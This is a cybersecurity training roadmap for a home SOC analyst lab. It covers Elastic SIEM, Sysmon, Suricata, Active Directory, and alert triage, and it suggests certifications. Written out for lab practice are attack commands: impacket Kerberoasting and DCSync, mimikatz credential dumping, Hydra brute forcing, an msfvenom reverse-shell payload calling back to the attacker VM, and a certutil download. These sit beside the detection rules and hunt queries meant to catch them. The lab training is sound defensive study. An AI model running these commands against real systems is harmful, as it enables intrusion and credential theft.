Track 1 — Build Your Home SOC Lab
Everything runs locally on your machine. This is where real skill is built.
01
Set Up Your Virtual Lab Environment
VirtualBox or UTM · 3 VMs · isolated network · ~3 hours
VirtualBoxUbuntu ServerKali LinuxWindows 10Networking
▶
Your lab is the foundation for everything else. You need 3 virtual machines — one as your SIEM (Ubuntu), one as your victim endpoint (Windows), and one as your attacker (Kali). They need to communicate with each other but be isolated from your real network.
1
Install your hypervisor
Windows or Intel Mac: download VirtualBox and the Extension Pack from the same page. Apple Silicon Mac (M1/M2/M3): download UTM instead — VirtualBox does not work on Apple Silicon.
VirtualBoxUTM (Mac only)
2
Download your 3 OS images
Ubuntu Server 22.04 LTS → your SIEM host
Kali Linux → your attacker node (use Virtual Machine pre-built image)
Windows 10 Enterprise Evaluation → free 90-day trial, your victim endpoint

Apple Silicon Mac users: download the ARM64 versions of Ubuntu and the Apple Silicon Kali image. Windows installs via UTM Gallery automatically.
3
Create your 3 VMs with these specs
SIEM-Ubuntu: 4–6GB RAM, 50GB storage, 2 CPUs
WIN10-Victim: 4–6GB RAM, 60GB storage, 2 CPUs
Kali-Attacker: 2–4GB RAM, 40GB storage, 2 CPUs

Install each OS. Ubuntu: username socadmin, enable OpenSSH. Windows: skip Microsoft account, create local user. Kali: default login is kali/kali — change password immediately.
If you have 16GB RAM: run 2 VMs at a time max. If you have 32GB: run all 3 simultaneously.
4
Configure isolated networking
In VirtualBox: each VM → Settings → Network → set to Host-Only Adapter. Give Kali a second adapter set to NAT so it can reach the internet for tool downloads. Boot each VM and confirm they can ping each other. This keeps your attack simulations off your real home network.
VirtualBox Network ManagerHost-Only AdapterNAT
PHASE GOALAll 3 VMs boot and can ping each other. You're ready to build your detection stack on top.
02
Deploy Elastic SIEM + Suricata IDS
Elastic 8 · Kibana · Sysmon · Suricata · Fleet · ~4 hours
ElasticsearchKibanaSysmonSuricataFleetDashboards
▶
Elastic SIEM is your detection engine — every alert flows through here. Sysmon gives you deep Windows endpoint telemetry. Suricata gives you network-level detection. Together they cover both host and network visibility.
1
Install Elasticsearch and Kibana on Ubuntu
SSH into your Ubuntu VM and run these commands one at a time:
sudo apt update && sudo apt upgrade -y
wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -
sudo apt install apt-transport-https -y
echo 'deb https://artifacts.elastic.co/packages/8.x/apt stable main' | sudo tee /etc/apt/sources.list.d/elastic-8.x.list
sudo apt update && sudo apt install elasticsearch kibana -y
sudo systemctl enable --now elasticsearch kibana
Then reset the elastic password: sudo /usr/share/elasticsearch/bin/elasticsearch-reset-password -u elastic — save this password. Open your browser and go to http://[ubuntu-ip]:5601 — Kibana should load.
2
Install Sysmon on Windows 10 with SwiftOnSecurity config
On your Windows VM: download Sysmon from Microsoft Sysinternals. Download the SwiftOnSecurity config — this is a community-maintained best-practice Sysmon configuration. Open PowerShell as Administrator and run: .\\Sysmon64.exe -accepteula -i sysmonconfig-export.xml. Sysmon now logs all process creation, network connections, file writes, and registry changes.
SysmonSwiftOnSecurity configPowerShell
3
Connect Windows to Elastic via Fleet
In Kibana: go to Fleet → Add Agent → copy the PowerShell install command shown on screen. Run that command in your Windows VM PowerShell. Wait 60 seconds — the agent appears in Fleet. Click it → enable the Windows integration and Sysmon integration. Go to Kibana → Discover and confirm logs are flowing. You should see Event IDs 4624, 4625, 4688, 4698 and Sysmon events 1, 3, 10, 11, 13.
4
Install Suricata IDS on Ubuntu
On Ubuntu: sudo apt install suricata -y then sudo suricata-update to download the latest ET Open threat rules. Edit the config to set your network interface: sudo nano /etc/suricata/suricata.yaml. Start it: sudo systemctl enable --now suricata. Test: from Kali run nmap [ubuntu-ip] and check sudo tail -f /var/log/suricata/fast.log — you should see the scan alert. Install Filebeat to forward Suricata logs to Elastic: sudo apt install filebeat → enable suricata module → connect to Elasticsearch.
SuricataET Open RulesFilebeat
5
Build 5 Kibana detection dashboards
In Kibana → Analytics → Dashboards → Create. Build these 5 dashboards using KQL filters:
1. Authentication — Event ID 4624 (logins) and 4625 (failed logins) over time
2. Process Activity — top processes created, PowerShell executions, encoded commands
3. Network — top destination IPs and ports, unusual outbound connections
4. IDS Alerts — Suricata alerts by severity and category
5. Persistence — scheduled tasks (4698), services installed (7045), registry changes (Sysmon 13)
These are what a real SOC analyst checks at the start of every shift.
PHASE GOALWindows and Sysmon logs flow into Kibana. Suricata alerts appear. 5 dashboards built. Your SIEM is live.

Build an Active Directory Environment
Active Directory · Domain Controller · AD attacks · ~3 hours
Active DirectoryKerberosBloodHoundGroup PolicyAD Attacks
▶
The vast majority of enterprise SOC alerts involve Active Directory. If you don't understand AD, you can't triage most alerts. Build it, attack it, detect the attacks.
1
Promote Windows 10 to a Domain Controller
Open PowerShell as Administrator on your Windows VM and run:
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools
Install-ADDSForest -DomainName 'lab.local'
Set a DSRM password when prompted. Let the machine restart. Log back in as lab\Administrator.
2
Create users and organizational units
Open Active Directory Users and Computers (ADUC). Create 3 OUs: IT, HR, Finance. Create users: john.doe (IT), jane.smith (HR), bob.jones (Finance) — set password Password123 on all. Create one admin user: lab-admin → add to Domain Admins group. Create a GPO to disable Windows Defender for the domain (so attack tools work in your lab).
ADUCGroup Policy Management
3
Simulate and detect 6 AD attacks from Kali
Run each attack from Kali, then immediately find it in Kibana:

Password Spray: crackmapexec smb [win-ip] -u users.txt -p 'Password123' → look for Event ID 4625 spike
AS-REP Roasting: impacket-GetNPUsers lab.local/ -no-pass -usersfile users.txt → Event ID 4768
Kerberoasting: impacket-GetUserSPNs lab.local/john.doe:Password123 -request → Event ID 4769
BloodHound recon: run SharpHound on Windows → visualize attack paths in BloodHound
Pass-the-Hash: dump hashes with mimikatz → crackmapexec smb [win-ip] -H [hash]
DCSync: impacket-secretsdump lab.local/lab-admin:Password123@[win-ip] → Event ID 4662

For each: identify the Event ID, map to a MITRE ATT&CK technique, write a triage note.
CrackMapExecImpacketBloodHoundmimikatz
PHASE GOALAD domain running. 6 attacks simulated and detected in Kibana. Every attack mapped to ATT&CK.
04
Attack Simulation + Alert Triage
8 attack types · KQL detection rules · 7 runbooks · ~6 hours
MetasploitmimikatzKQL RulesSigmaRunbooksPICERL
▶
This phase is the core of what L1 SOC analysts do every day — receive an alert, investigate it, decide what it is, document it, and close it or escalate. You generate real attacks and triage the real alerts they produce.
1
Run 8 attack scenarios and triage each alert in Kibana
1. Port scan: nmap -sV -sC [win-ip] → find in Sysmon Event 3 + Suricata
2. RDP brute force: hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://[win-ip] → Event 4625 spike
3. Reverse shell: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[kali] LPORT=4444 -f exe > shell.exe → transfer to Windows → run → Sysmon 1 and 3
4. Encoded PowerShell: on Windows: powershell -enc [base64] → Sysmon Event 1 with -enc in args
5. Credential dump: run mimikatz sekurlsa::logonpasswords → Sysmon Event 10 (LSASS access)
6. Scheduled task: schtasks /create /tn Updater /tr calc.exe /sc onlogon → Event 4698
7. Registry persistence: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /d calc.exe → Sysmon 13
8. LOLBin abuse: certutil.exe -urlcache -split -f http://[kali]:8000/test.txt test.txt → Sysmon 1

For EVERY attack: write a triage note — what fired, what host, what user, is this a true positive, what ATT&CK technique.
MetasploitHydramimikatzKibana KQL
2
Write 7 custom KQL detection rules in Elastic
In Kibana → Security → Rules → Create Rule. Build these:
1. LSASS Access: winlog.event_data.TargetImage: *lsass.exe AND NOT process.name: (MsMpEng.exe) → Critical
2. Encoded PowerShell: process.name: powershell.exe AND process.command_line: *-enc* → High
3. Certutil Download: process.name: certutil.exe AND process.command_line: *urlcache* → High
4. Scheduled Task Created: event.code: 4698 → Medium
5. RDP Brute Force: event.code: 4625 AND winlog.event_data.LogonType: 10 threshold 10/60s → High
6. New Admin Added: event.code: 4732 AND group.name: Administrators → Critical
7. WMI Execution: process.parent.name: WmiPrvSE.exe AND process.name: (cmd.exe OR powershell.exe) → High
Test each rule by running the matching attack. Confirm it fires.
3
Write a runbook for each of these 7 alert types
A runbook is a step-by-step decision guide for handling a specific alert. Write one for: Brute Force, Malware Execution, Phishing, Privilege Escalation, C2 Beaconing, LSASS Access, Lateral Movement. Each runbook should define: what triggered it → what to check in order → IOC lookups to run → when to escalate → when to close. Save all 7 as Markdown files in your GitHub repo.
GitHubMarkdown
4
Write PICERL incident reports for every attack
For each of your 8 attack simulations, write a full incident report using the PICERL framework:
Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned

Each report should include: timeline, ATT&CK technique, IOC table, containment steps, and remediation. These become your portfolio. Publish all of them to GitHub.
PHASE GOAL8 attacks simulated and triaged. 7 detection rules firing. 7 runbooks written. 8 incident reports in GitHub.
05
Deep Log Analysis
Windows Event IDs · Linux logs · Firewall logs · ~4 hours
Event IDsauditdauth.logUFWSysmon
▶
A SOC analyst reads logs all day. Windows events, Linux auth logs, firewall logs — you need to know what's normal and what's suspicious in each one without having to look things up.
1
Memorize the critical Windows Event IDs
Trigger each one in your lab then find it in Kibana. Know these cold:

Authentication: 4624 (login — note logon types: 2=local, 3=network, 10=RDP), 4625 (failed login), 4648 (explicit credentials used)
Kerberos: 4768 (TGT requested), 4769 (service ticket — Kerberoasting), 4771 (pre-auth failure)
Accounts: 4720 (user created), 4724 (password reset), 4728/4732 (added to group), 4756 (added to universal group)
Process: 4688 (process created), 4689 (process exited)
Persistence: 4698 (scheduled task created), 7045 (service installed)
Sysmon: 1 (process create), 3 (network connect), 10 (process access/LSASS), 11 (file create), 13 (registry set)
2
Analyze Linux logs on your Ubuntu VM
From Kali: run an SSH brute force: hydra -l socadmin -P /usr/share/wordlists/rockyou.txt ssh://[ubuntu-ip]. On Ubuntu check: sudo tail -f /var/log/auth.log — find the failed attempts with source IP and username. Install auditd: sudo apt install auditd. Add a file watch: sudo auditctl -w /etc/passwd -p wa -k passwd_watch. Modify the file → check: sudo ausearch -k passwd_watch. Forward auth.log to Elastic via Filebeat.
auth.logauditdFilebeat
3
Set up and analyze firewall logs
On Ubuntu: sudo apt install ufw -y → sudo ufw logging on → sudo ufw enable. From Kali run an nmap scan → check sudo tail -f /var/log/ufw.log. Understand the fields: SRC (source IP), DPT (destination port), PROTO (protocol). Signs of a port scan: multiple entries from same source with different destination ports in seconds. Forward UFW logs to Elastic. Build a Kibana dashboard showing top blocked IPs and targeted ports.
PHASE GOALAll critical Event IDs memorized. Linux and firewall logs in Kibana. Brute force and port scan detected in logs.
06
Network Traffic Analysis
Wireshark · PCAP analysis · C2 detection · DNS tunneling · ~4 hours
WiresharktcpdumpC2 BeaconingDNS TunnelingPCAP Forensics
▶
Every SOC alert has network evidence. You need to be able to open a packet capture and tell a story of what happened — who talked to who, what they sent, and whether it was malicious.
1
Install Wireshark and capture your own attack traffic
Download Wireshark and install it on your host machine (not in a VM). On Kali while running your reverse shell attack: tcpdump -i eth0 -w /tmp/attack.pcap. Copy the PCAP to your host and open it in Wireshark. Filter: ip.addr==[kali-ip] AND ip.addr==[win-ip]. Find the Meterpreter C2 channel — look for a persistent TCP connection with regular data. Right-click → Follow → TCP Stream to see the tunnel.
Wiresharktcpdump
2
Analyze real malware PCAPs with answer keys
Go to malware-traffic-analysis.net — download 5 exercise PCAPs (unzip password: infected). For each PCAP answer: What is the victim IP? What is the C2 IP? What protocol is the C2 using? Is there beaconing (periodic connections at regular intervals)? Was data exfiltrated? Check Statistics → Conversations to identify the most active connections. Check every external IP in VirusTotal. Compare your findings against the answer key. Write an incident report for each one.
WiresharkVirusTotalAbuseIPDB
3
Key Wireshark filters every SOC analyst should know
dns → all DNS queries — look for long subdomains (tunneling)
http.request → all HTTP requests — look for suspicious URIs
tcp.flags.syn==1 && tcp.flags.ack==0 → connection attempts
ip.addr==x.x.x.x → all traffic to/from a specific IP
frame contains "password" → search packet content
tcp.stream eq N → follow a specific TCP conversation
Practice using all of these on your lab PCAPs.
PHASE GOAL5 malware PCAPs analyzed with written reports. You can identify C2 beaconing and DNS tunneling in a PCAP.

Malware Analysis + Phishing Investigation

PEStudioAny.runStatic AnalysisPhishingSPF/DKIM/DMARC
▶
Phishing investigation is the #1 most common L1 SOC task. Malware analysis lets you understand what a sample does before it causes damage. Learn both.
1
Static malware analysis with PEStudio
Download PEStudio on your Windows VM. Get safe malware samples from MalwareBazaar. Only analyze inside your isolated VM. Open a sample in PEStudio and examine:
→ Indicators tab: PEStudio flags suspicious items automatically
→ Imports tab: dangerous APIs to look for: CreateRemoteThread, WriteProcessMemory (injection), VirtualAlloc (shellcode)
→ Strings tab: hardcoded IPs, domains, file paths, registry keys
→ Sections tab: entropy above 7 = packed or encrypted
Check the file hash on VirusTotal. Write a report: hash, suspicious imports, IOCs found, verdict.

Dynamic malware analysis in Any.run sandbox
Go to any.run (free account, browser-based). Upload a malware sample → click Run → watch it execute live. Document:
→ What processes were created?
→ What network connections were made? (C2 IPs and domains)
→ What files were dropped?
→ What registry keys were written?
→ Click the ATT&CK Matrix tab — see what techniques were identified automatically
Export all IOCs: IPs, domains, hashes, file paths. Write a dynamic analysis report.
Any.runVirusTotalMITRE ATT&CK

Phishing email investigation — full workflow
Download real phishing samples from github.com/rf-peixoto/phishing_pot. For each sample follow this exact process:

Step 1 — Headers: paste into mxtoolbox.com/EmailHeaders.aspx → check SPF, DKIM, DMARC pass/fail. Is Reply-To different from From?
Step 2 — Sender domain: run whois → was the domain registered in the last 30 days?
Step 3 — URLs: paste every URL into urlscan.io AND VirusTotal
Step 4 — Attachment: upload to any.run → read sandbox report
Step 5 — IOC table: list all malicious IPs, domains, hashes
Step 6 — Write report and save to GitHub

Do this for 5 different samples. One report per sample.

08
Threat Hunting
Hypothesis-driven hunting · Sigma rules · ATT&CK Navigator · ~3 hours
KQL HuntingLOLBinsC2 DetectionSigma RulesATT&CK
▶
Threat hunting is proactive — you go looking for threats before an alert fires. It's what separates L2 analysts from L1. Start learning it now.
1
Write and run 7 threat hunt queries in Kibana
Hunt 1 — Unusual parent-child: process.name: cmd.exe AND process.parent.name: winword.exe — Word spawning cmd is malicious
Hunt 2 — PowerShell download cradles: process.command_line: (*DownloadString* OR *WebClient* OR *Invoke-Expression*)
Hunt 3 — LSASS readers: winlog.event_data.TargetImage: *lsass.exe AND NOT process.name: (MsMpEng.exe OR svchost.exe)
Hunt 4 — Common C2 ports: destination.port: (4444 OR 1337 OR 8888 OR 9999)
Hunt 5 — DNS tunneling: dns.question.type: TXT AND dns.question.name.length > 50
Hunt 6 — New services: event.code: 7045 — check binary path for suspicious locations
Hunt 7 — Encoded commands: process.command_line: (*-enc* OR *-EncodedCommand*)

Document each hunt: hypothesis → query → findings → verdict. If a hunt finds something real, promote it to a detection rule.
2
Write Sigma rules for your top detections
Sigma is a vendor-neutral detection format that converts to Elastic, Splunk, Sentinel, or any SIEM. Go to github.com/SigmaHQ/sigma and read the format documentation. Write Sigma rules for: encoded PowerShell, LSASS access, certutil download, and WMI execution. Use sigma-cli to convert them to Kibana format. Publish all rules to your GitHub portfolio — this is a strong differentiator.
Sigmasigma-cliGitHub
3
Build an ATT&CK Navigator heatmap
Go to mitre-attack.github.io/attack-navigator. Map every attack you've simulated and every detection rule you've written to an ATT&CK technique. Color-code them (detected = green, simulated but not detected = yellow). Export the heatmap and add it to your GitHub portfolio. This visually shows your detection coverage.
ATT&CK NavigatorMITRE ATT&CK

L2 SkillPythonVirusTotal APIAutomationLog Parsing

Script 3 — Log parser: reads a Windows event log export → extracts all failed login IPs → outputs them sorted by frequency. Shows you the top brute force sources at a glance.

Add error handling (try/except) to each script. Add comments. Publish all 3 to GitHub with README files explaining what each one does.

02 — Certifications

Which Certs Actually Matter

Focus on these. In this order. Don't get distracted by expensive or irrelevant certs.

CompTIA Security+
GET THIS FIRST
The baseline. Required or preferred on almost every SOC job posting. Covers security fundamentals, threat management, and incident response concepts. Do this before anything else.
CompTIA Network+
GET THIS EARLY
Understanding networking is non-negotiable for SOC work. TCP/IP, DNS, HTTP, VPNs, firewalls — you can't analyze network alerts without this foundation.
CompTIA CySA+
SOC FOCUSED
The most SOC-specific cert at this level. Covers threat detection, SIEM analysis, incident response, and vulnerability management. ATS systems at MSSPs filter for this. Get it after Security+.
AWS Security Specialty
DIFFERENTIATOR
If you're targeting cloud-adjacent SOC roles, this is your edge. Most L1 candidates don't have it. Covers GuardDuty, CloudTrail, Security Hub, IAM security, and cloud incident response.
SSCP — (ISC)²
L2 TARGET
Opens doors at defense contractors and federal roles. Good complement to CySA+ for L2 positions. Study after you have 12+ months of experience.
CCSP — (ISC)²
CLOUD PATH
Cloud Security Professional certification. Targets L2+ cloud SOC and cloud security engineer roles. Long-term goal — get this after you're in your first SOC role.
WGU BSCSIA
DEC 2026
Bachelor of Science in Cybersecurity and Information Assurance — Western Governors University. Includes 13 industry certifications built into the curriculum covering network defense, cloud security, ethical hacking, and digital forensics. Pairs directly with every lab in this roadmap.
Azure / Sentinel certs
IF AZURE FOCUSED
SC-200 (Microsoft Security Operations Analyst) is worth getting if you want to target Microsoft Sentinel environments. Good complement to the AWS Security Specialty.
